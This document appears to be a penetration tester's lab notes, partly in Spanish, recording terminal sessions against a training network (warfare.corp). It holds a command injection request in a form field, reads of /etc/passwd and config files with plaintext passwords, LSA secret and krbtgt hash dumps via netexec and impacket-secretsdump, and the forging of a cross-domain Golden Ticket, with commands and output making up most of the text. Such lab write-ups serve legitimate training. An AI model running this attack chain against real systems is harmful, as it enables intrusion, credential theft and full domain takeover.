└─$ nmap -sn 10.10.200.228/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-23 23:52 EDT
Nmap scan report for 10.10.200.1
Host is up (0.099s latency).
Nmap scan report for 10.10.200.134
Host is up (0.26s latency).
Nmap scan report for 10.10.200.144
Host is up (0.23s latency).
Nmap scan report for 10.10.200.220
Host is up (0.36s latency).
Nmap scan report for 10.10.200.227
Host is up (0.31s latency).
Nmap scan report for 10.10.200.228
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 20.41 seconds



# ip UP


10.10.200.228
10.10.200.134
10.10.200.144
10.10.200.220
10.10.200.227
10.10.200.228



# RED INTERNA
192.168.80.0/24


──(kali㉿kali)-[~/Downloads/crta]
└─$ nmap -sn 192.168.80.0/24                                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 00:04 EDT
Nmap scan report for 192.168.80.1
Host is up (0.085s latency).
Nmap scan report for 192.168.80.10
Host is up (0.14s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 10.71 seconds




┌──(kali㉿kali)-[~/Downloads/crta]
└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.80.1 -oN scan_80_1.txt

[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 00:08 EDT
Nmap scan report for 192.168.80.1
Host is up (0.77s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
53/tcp open  domain
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 30.69 seconds








POST /dashboard1.php HTTP/1.1
Host: 192.168.80.10
Content-Length: 11
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.80.10
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.80.10/dashboard1.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=si290vt7lima3ur5knsk18msbg; id=test
Connection: keep-alive
EMAIL=ls -l








---
──(kali㉿kali)-[~/Downloads/crta]
└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 192.168.80.10 -oN scan_80_10.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 00:09 EDT
Nmap scan report for 192.168.80.10
Host is up (1.4s latency).
Not shown: 52653 closed tcp ports (reset), 12879 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1234/tcp open  hotline

Nmap done: 1 IP address (1 host up) scanned in 33.73 seconds
                                                                                                                                                                                   
┌──(kali㉿kali)-[~/Downloads/crta]
└─$ 



```bash
total 396
drwxrwxr-x 3 privilege privilege  4096 Jan 16  2025 Template Main
-rw-rw-r-- 1 privilege privilege 15114 Feb  4  2023 add.php
-rw-rw-r-- 1 privilege privilege 17191 Feb  4  2023 addemp.php
drwxrwxr-x 7 privilege privilege  4096 Feb  4  2023 assets
-rw-rw-r-- 1 privilege privilege 15326 Feb  4  2023 career.php
-rw-rw-r-- 1 privilege privilege   352 Feb  4  2023 config.php
drwxrwxr-x 2 privilege privilege  4096 Feb  4  2023 css
-rw-rw-r-- 1 privilege privilege 16218 Feb  4  2023 dashboard1.php
-rw-rw-r-- 1 privilege privilege 17915 Feb  4  2023 dashboard2.php
-rw-rw-r-- 1 privilege privilege 27081 Feb  4  2023 dashboard3.php
-rw-rw-r-- 1 privilege privilege   732 Feb  4  2023 dbcontroller.php
-rw-rw-r-- 1 privilege privilege   721 Feb  4  2023 down.php
-rw-rw-r-- 1 privilege privilege  5299 Feb  4  2023 emplogin.php
-rw-rw-r-- 1 privilege privilege  2498 Feb  4  2023 filelog.php
drwxrwxr-x 2 privilege privilege  4096 Feb  4  2023 fonts
-rw-rw-r-- 1 privilege privilege  5616 Apr 14  2023 index.php
drwxrwxr-x 2 privilege privilege  4096 Feb  4  2023 js
-rw-rw-r-- 1 privilege privilege   302 Feb  4  2023 logout.php
-rw-rw-r-- 1 privilege privilege    46 Feb  4  2023 malicious.php
-rw-rw-r-- 1 privilege privilege 13529 Feb  4  2023 order2.php
-rw-rw-r-- 1 privilege privilege   913 Feb  4  2023 os.php
-rw-rw-r-- 1 privilege privilege   267 Feb  4  2023 pdfresum.php
-rw-rw-r-- 1 privilege privilege  4362 Jan 17  2025 registration.php
-rw-rw-r-- 1 privilege privilege 12910 Feb  4  2023 rememp.php
-rw-rw-r-- 1 privilege privilege 11892 Feb  4  2023 report.php
-rw-rw-r-- 1 privilege privilege    13 Feb  4  2023 sam.txt
-rw-rw-r-- 1 privilege privilege    76 Feb  4  2023 script.sh
-rw-rw-r-- 1 privilege privilege    11 Feb  4  2023 script1.sh
-rw-rw-r-- 1 privilege privilege   444 Feb  4  2023 search.php
-rw-rw-r-- 1 privilege privilege 19299 Feb  4  2023 shop-grid.php
-rw-rw-r-- 1 privilege privilege 99233 Feb  4  2023 style.css
-rw-rw-r-- 1 privilege privilege   436 Feb  4  2023 test5.php
-rw-rw-r-- 1 privilege privilege   131 Feb  4  2023 test6.php
-rw-rw-r-- 1 privilege privilege   199 Feb  4  2023 test7.php
-rw-rw-r-- 1 privilege privilege    58 Feb  4  2023 test8.php
-rw-rw-r-- 1 privilege privilege  3134 Feb  4  2023 testup.php
-rw-rw-r-- 1 privilege privilege  3247 Feb  4  2023 val.php

```
```bash
</script>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
saned:x:117:123::/var/lib/saned:/usr/sbin/nologin
nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false
whoopsie:x:120:125::/nonexistent:/bin/false
colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
fwupd-refresh:x:122:127:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
geoclue:x:123:128::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:129:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:126:131:Gnome Display Manager:/var/lib/gdm3:/bin/false
sssd:x:127:132:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
privilege:x:1001:1001:Admin@962:/home/privilege:/bin/bash
sshd:x:128:65534::/run/sshd:/usr/sbin/nologin
mysql:x:129:135:MySQL Server,,,:/nonexistent:/bin/false
						</div>
                        ```

Admin@962


<?php      
        $host = "localhost";  
        $user = "root";  
        $password = 'Web!@#$%';  
        $db_name = "pro";  
          
        $db = mysqli_connect($host, $user, $password, $db_name);
        
        if(mysqli_connect_errno()) {  
            die("Failed to connect with MySQL: ". mysqli_connect_error());  
        }  
?>




/html>privilege@ubuntu-virtual-machine:/tmp$ cat /var/www/html/config.php 
<?php      
        $host = "localhost";  
        $user = "root";  
        $password = 'Web!@#$%';  
        $db_name = "pro";  
          
        $db = mysqli_connect($host, $user, $password, $db_name);
        
        if(mysqli_connect_errno()) {  
            die("Failed to connect with MySQL: ". mysqli_connect_error());  
        }  
    ?> 


privilege@ubuntu-virtual-machine:/tmp$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 8.0.40-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pro                |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use pro;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables:
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ':' at line 1
mysql> show tables;
+---------------+
| Tables_in_pro |
+---------------+
| login         |
+---------------+
1 row in set (0.00 sec)


mysql> select * from login;
+-----+-------+---------------+-----------------+
| sno | user  | pass          | mail            |
+-----+-------+---------------+-----------------+
|   1 | salve | 123           | salve@salve.com |
|   2 | test  | Patito.123456 | test@tes.com    |
|   3 | test2 | Patito.123456 | test2@test.com  |
+-----+-------+---------------+-----------------+
3 rows in set (0.00 sec)

mysql> 








ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.80.10  netmask 255.255.255.0  broadcast 192.168.80.255
        ether 00:50:56:96:66:fb  txqueuelen 1000  (Ethernet)
        RX packets 143913  bytes 21712902 (21.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 118747  bytes 13768359 (13.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:50:56:96:ed:da  txqueuelen 1000  (Ethernet)
        RX packets 221  bytes 25390 (25.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 14199  bytes 601675 (601.6 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000  




==============================================================

privilege@ubuntu-virtual-machine:/tmp$ cat fping.sh 
#!/bin/bash

# Uso: ./fping.sh 192.168.1
# Eso escaneará 192.168.1.1 - 192.168.1.254

RED=$1

if [ -z "$RED" ]; then
  echo "Uso: $0 <red>"
  echo "Ejemplo: $0 192.168.1"
  exit 1
fi

echo "Escaneando red: $RED.0/24 ..."
for i in {1..254}; do
  ping -c 1 -W 1 $RED.$i > /dev/null 2>&1
  if [ $? -eq 0 ]; then
    echo "[+] Host activo: $RED.$i"
  fi
done



privilege@ubuntu-virtual-machine:/tmp$ 





privilege@ubuntu-virtual-machine:/tmp$ ./fping.sh 192.168.98
Escaneando red: 192.168.98.0/24 ...
[+] Host activo: 192.168.98.2
[+] Host activo: 192.168.98.15
[+] Host activo: 192.168.98.30
[+] Host activo: 192.168.98.120

privilege@ubuntu-virtual-machine:/tmp$ ping -c 1 192.168.98.15
64 bytes from 192.168.98.15: icmp_seq=1 ttl=64 time=0.022 ms

privilege@ubuntu-virtual-machine:/tmp$ ping -c 1 192.168.98.30
64 bytes from 192.168.98.30: icmp_seq=1 ttl=128 time=0.331 ms

privilege@ubuntu-virtual-machine:/tmp$ ping -c 1 192.168.98.120
64 bytes from 192.168.98.120: icmp_seq=1 ttl=128 time=0.248 ms




privilege@ubuntu-virtual-machine:~/.mozilla/firefox/b2rri1qd.default-release$ sqlite3 places.sqlite 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> ls
   ...> :
   ...> ;
Error: near "ls": syntax error
sqlite> .tables
moz_anno_attributes                 moz_keywords                      
moz_annos                           moz_meta                          
moz_bookmarks                       moz_origins                       
moz_bookmarks_deleted               moz_places                        
moz_historyvisits                   moz_places_metadata               
moz_inputhistory                    moz_places_metadata_search_queries
moz_items_annos                     moz_previews_tombstones           
sqlite> select * from moz_bookmarks;
1|2||0|0||||1737028376389000|1737028407427000|root________|1|1
2|2||1|0|menu|||1737028376389000|1737028376683000|menu________|1|3
3|2||1|1|toolbar|||1737028376389000|1737028376773000|toolbar_____|1|3
4|2||1|2|tags|||1737028376389000|1737028376389000|tags________|1|1
5|2||1|3|unfiled|||1737028376389000|1737028407427000|unfiled_____|1|3
6|2||1|4|mobile|||1737028376397000|1737028376662000|mobile______|1|2
7|2||2|0|Mozilla Firefox|||1737028376683000|1737028376683000|2hqCSTYguEKz|0|1
8|1|3|7|0|Get Help|||1737028376683000|1737028376683000|w8bhWWymMHw6|0|1
9|1|4|7|1|Customize Firefox|||1737028376683000|1737028376683000|uctFzas86dQw|0|1
10|1|5|7|2|Get Involved|||1737028376683000|1737028376683000|z-X79YDQmgEh|0|1
11|1|6|7|3|About Us|||1737028376683000|1737028376683000|GeWYCw2g0FLJ|0|1
12|2||2|1|Ubuntu and Free Software links|||1737028376683000|1737028376683000|MxAMPgqX16gZ|0|1
13|1|7|12|0|Ubuntu|||1737028376683000|1737028376683000|QqE4CH5UIHOL|0|1
14|1|8|12|1|Ubuntu Wiki (community-edited website)|||1737028376683000|1737028376683000|nbf_eTKjwhpv|0|1
15|1|9|12|2|Make a Support Request to the Ubuntu Community|||1737028376683000|1737028376683000|ukdJ8dcfVTPm|0|1
16|1|10|12|3|Debian (Ubuntu is based on Debian)|||1737028376683000|1737028376683000|xgQMK5g3l2Zp|0|1
17|1|11|3|0|Getting Started|||1737028376773000|1737028376773000|Kt6IQ_eV70GT|0|1
18|1|16|5|0|http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7
sqlite> 






user: child\employee
PAss: Doctor@963


# RED EXTERNA


cat /etc/hosts   

127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
#10.200.150.10 tryhackme.loc dc.tryhackme.loc
10.201.64.240 thm.local
192.168.98.2 warfare.corp DC01 DC01.warfare.corp
192.168.98.120 child.warfare.corp CDC CDC.child.warfare.corp




---------------------------------------------------------------------------------------------------------------------------------------------------------------------


netexec  smb 192.168.98.2                      
SMB         192.168.98.2    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:warfare.corp) (signing:True) (SMBv1:False) 



netexec --verbose smb 192.168.98.120 -u john -p User1@#$%6
192.168.98.2



---------------------------------------------------------------------------------------------------------------------------------------------------------------------

[+] Host activo: 192.168.98.30


└─$ netexec  smb 192.168.98.30 -u john -p 'User1@#$%6'                                     
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)



└─$ netexec  smb 192.168.98.30 -u john -p 'User1@#$%6'                                     
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
                                                                                                     


---------------------------------------------------------------------------------------------------------------------------------------------------------------------
[+] Host activo: 192.168.98.120


┌──(kali㉿kali)-[~/Downloads]
└─$ netexec  smb 192.168.98.120                        
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 


                                             
┌──(kali㉿kali)-[~/Downloads]
└─$ netexec  smb 192.168.98.120 -u john -p 'User1@#$%6'  
SMB         192.168.98.120  445    CDC              [*] Windows 10 / Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:True) (SMBv1:False) 
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\john:User1@#$%6 




└─$ evil-winrm -i 192.168.98.30 -u john -p 'User1@#$%6'                                 



└─$ netexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa

[20:38:08] INFO     Socket info: host=192.168.98.30, hostname=192.168.98.30, kerberos=False, ipv6=False, link-local ipv6=False                                                                                                             connection.py:165
           INFO     Creating SMBv3 connection to 192.168.98.30                                                                                                                                                                                    smb.py:606
[20:38:10] INFO     Creating SMBv1 connection to 192.168.98.30                                                                                                                                                                                    smb.py:575
[20:38:11] INFO     SMBv1 disabled on 192.168.98.30                                                                                                                                                                                               smb.py:598
           INFO     Resolved domain: child.warfare.corp with dns, kdcHost: 192.168.98.30                                                                                                                                                          smb.py:321
SMB         192.168.98.30   445    MGMT             [*] Windows 10 / Server 2019 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False) 
           INFO     Creating SMBv3 connection to 192.168.98.30                                                                                                                                                                                    smb.py:606
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)
SMB         192.168.98.30   445    MGMT             [+] Dumping LSA secrets
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/john:$DCC2$10240#john#9855312d42ee254a7334845613120e61: (2025-01-17 14:47:56)
SMB         192.168.98.30   445    MGMT             CHILD.WARFARE.CORP/corpmngr:$DCC2$10240#corpmngr#7fd50bbab99e8ea7ae9c1899f6dea7c6: (2025-06-23 09:56:19)
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes256-cts-hmac-sha1-96:344c70047ade222c4ab35694d4e3e36de556692f02ec32fa54d3160f36246eec
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aes128-cts-hmac-sha1-96:aa5b3d84614911fe611eafbda613baaf
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:des-cbc-md5:6402e0c20b89d386
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:plain_password_hex:4f005d003b006f0074005d003500760067002f0032007a0046004e0020004d00700023003600570031005000770041002600700055003d005a0047006100370033003e003b0032004600410059002a006b0046004400410069003e00530066006a0033006e0061007a004e0060003300590063005e0048006c005c0053003e003e0033003c007300500043007a002500300031004b00610060002000540033007a003f004200580048002f0068006d0052006f0027005b00520061003b003a0075002b0050004a005d006b003c006d004c00730045005d005b0074006c004b00760045005c00280059003a0066002000
SMB         192.168.98.30   445    MGMT             CHILD\MGMT$:aad3b435b51404eeaad3b435b51404ee:0f5fe480dd7eaf1d59a401a4f268b563:::
SMB         192.168.98.30   445    MGMT             dpapi_machinekey:0x34e3cc87e11d51028ffb38c60b0afe35d197627d
dpapi_userkey:0xb890e07ba0d31e31c758d305c2a29e1b4ea813a5
SMB         192.168.98.30   445    MGMT             corpmngr@child.warfare.corp:User4&*&*
SMB         192.168.98.30   445    MGMT             [+] Dumped 9 LSA secrets to /home/kali/.nxc/logs/lsa/MGMT_192.168.98.30_2025-08-24_203810.secrets and /home/kali/.nxc/logs/lsa/MGMT_192.168.98.30_2025-08-24_203810.cached
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads/crta]
└─$ 

# La cuenta krbtgt es la encargada de firmar todos los tickets Kerberos en el dominio.

Si obtienes su hash o su clave AES, puedes generar tus propios tickets Kerberos válidos (Golden Tickets).

Con un Golden Ticket puedes hacerte pasar por cualquier usuario (incluso Administrador de Dominio) y acceder a cualquier servicio del dominio, sin importar contraseñas.



┌──(kali㉿kali)-[~/Downloads/crta]
└─$ impacket-secretsdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Calling DRSCrackNames for child\krbtgt 
[+] Calling DRSGetNCChanges for {1c0a5a45-4b61-4bdd-adfc-92982f35601d} 
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=child,DC=warfare,DC=corp
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:e57dd34c1871b7a23fb17a77dec9b900:::
[+] Leaving NTDSHashes.__decryptHash
[+] Entering NTDSHashes.__decryptSupplementalInfo
[+] Leaving NTDSHashes.__decryptSupplementalInfo
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
krbtgt:aes128-cts-hmac-sha1-96:806d6ea798a9626d3ad00516dd6968b5
krbtgt:des-cbc-md5:ba0b49b6b6455885
[*] Cleaning up...



# El script lookupsid.py (parte de Impacket) sirve para hacer enumeración de usuarios y grupos en un dominio Windows usando la técnica de SID Brute Forcing.



lookupsid.py child/corpmngr:'User4&*&*'@child.warfare.corp

impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp                                                    

```
└─$ impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp                                                    
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at child.warfare.corp
[*] StringBinding ncacn_np:child.warfare.corp[\pipe\lsarpc]
    [*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761
500: CHILD\Administrator (SidTypeUser)
501: CHILD\Guest (SidTypeUser)
502: CHILD\krbtgt (SidTypeUser)
512: CHILD\Domain Admins (SidTypeGroup)
513: CHILD\Domain Users (SidTypeGroup)
514: CHILD\Domain Guests (SidTypeGroup)
515: CHILD\Domain Computers (SidTypeGroup)
516: CHILD\Domain Controllers (SidTypeGroup)
517: CHILD\Cert Publishers (SidTypeAlias)
520: CHILD\Group Policy Creator Owners (SidTypeGroup)
521: CHILD\Read-only Domain Controllers (SidTypeGroup)
522: CHILD\Cloneable Domain Controllers (SidTypeGroup)
525: CHILD\Protected Users (SidTypeGroup)
526: CHILD\Key Admins (SidTypeGroup)
553: CHILD\RAS and IAS Servers (SidTypeAlias)
571: CHILD\Allowed RODC Password Replication Group (SidTypeAlias)
572: CHILD\Denied RODC Password Replication Group (SidTypeAlias)
1000: CHILD\CDC$ (SidTypeUser)
1101: CHILD\DnsAdmins (SidTypeAlias)
1102: CHILD\DnsUpdateProxy (SidTypeGroup)
1103: CHILD\WARFARE$ (SidTypeUser)
1104: CHILD\john (SidTypeUser)
1106: CHILD\corpmngr (SidTypeUser)
1107: CHILD\MGMT$ (SidTypeUser)
```


lookupsid.py child/corpmngr:'User4&*&*'@warfare.corp

impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp

```
─$ impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at warfare.corp
[*] StringBinding ncacn_np:warfare.corp[\pipe\lsarpc]
        [*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119
498: WARFARE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: WARFARE\Administrator (SidTypeUser)
501: WARFARE\Guest (SidTypeUser)
502: WARFARE\krbtgt (SidTypeUser)
512: WARFARE\Domain Admins (SidTypeGroup)
513: WARFARE\Domain Users (SidTypeGroup)
514: WARFARE\Domain Guests (SidTypeGroup)
515: WARFARE\Domain Computers (SidTypeGroup)
516: WARFARE\Domain Controllers (SidTypeGroup)
517: WARFARE\Cert Publishers (SidTypeAlias)
518: WARFARE\Schema Admins (SidTypeGroup)
519: WARFARE\Enterprise Admins (SidTypeGroup)
520: WARFARE\Group Policy Creator Owners (SidTypeGroup)
521: WARFARE\Read-only Domain Controllers (SidTypeGroup)
522: WARFARE\Cloneable Domain Controllers (SidTypeGroup)
525: WARFARE\Protected Users (SidTypeGroup)
526: WARFARE\Key Admins (SidTypeGroup)
527: WARFARE\Enterprise Key Admins (SidTypeGroup)
553: WARFARE\RAS and IAS Servers (SidTypeAlias)
571: WARFARE\Allowed RODC Password Replication Group (SidTypeAlias)
572: WARFARE\Denied RODC Password Replication Group (SidTypeAlias)
1000: WARFARE\DC01$ (SidTypeUser)
1101: WARFARE\DnsAdmins (SidTypeAlias)
1102: WARFARE\DnsUpdateProxy (SidTypeGroup)
1103: WARFARE\CHILD$ (SidTypeUser)
```


# RESULTADOS

1. krbtgt aes256 Hash
        ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2

2. Parent SID : 
        S-1-5-21-3375883379-808943238-3239386119

3. Child SID : 
        S-1-5-21-3754860944-83624914-1883974761


Qué se va a hacer?

Se va a crear un Golden Ticket usando ticketer.py de Impacket.
El Golden Ticket es un ticket TGT falsificado que te permite ser cualquier usuario del dominio, incluso Domain Admin, sin conocer su contraseña real.


📌 ¿Qué se logra con esto?

- Se genera un Golden Ticket para corpmngr.
- Este ticket no expira nunca (o hasta que cambies la clave krbtgt).
- El atacante podrá:
  - Acceder a recursos como Domain Admin en el dominio hijo.
  - Escalar privilegios y acceder también al dominio padre (gracias al extra-sid).
  - Moverse lateralmente por toda la forest de Active Directory.

👉 En resumen:
Con el hash del krbtgt del Child Domain y los SIDs del Child y Parent, se crea un Golden Ticket que le da al usuario corpmngr privilegios de Domain Admin tanto en el dominio hijo como en el padre.

ticketer.py -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'


```bash
┌──(kali㉿kali)-[~/Downloads/crta]
└─$ impacket-ticketer -domain child.warfare.corp -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 -domain-sid S-1-5-21-3754860944-83624914-1883974761 -groups 516 -user-id 1106 -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 'corpmngr'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for child.warfare.corp/corpmngr
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in corpmngr.ccache
```                                                 
┌──(kali㉿kali)-[~/Downloads/crta]
└─$ 



# Let’s set the ccache file to the environment variable.

export KRB5CCNAME=corpmngr.ccache

# Estás moviendo lateralmente dentro del dominio, usando tu Golden Ticket para pedir acceso a un servicio específico en un host del dominio, sin necesitar contraseñas.
## Request Service Ticket using the ccache file.




# 🔹 ¿Qué hace exactamente?

Lee el ticket TGT de corpmngr desde el archivo .ccache (Golden Ticket).

Solicita un Service Ticket (TGS) para el servicio SMB (CIFS/dc01.warfare.corp).

Ese TGS permite luego autenticarse directamente contra el servicio sin necesidad de la contraseña real, usando Kerberos.

getST.py -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug

┌──(kali㉿kali)-[~/Downloads/crta]
└─$ impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Using Kerberos Cache: corpmngr.ccache
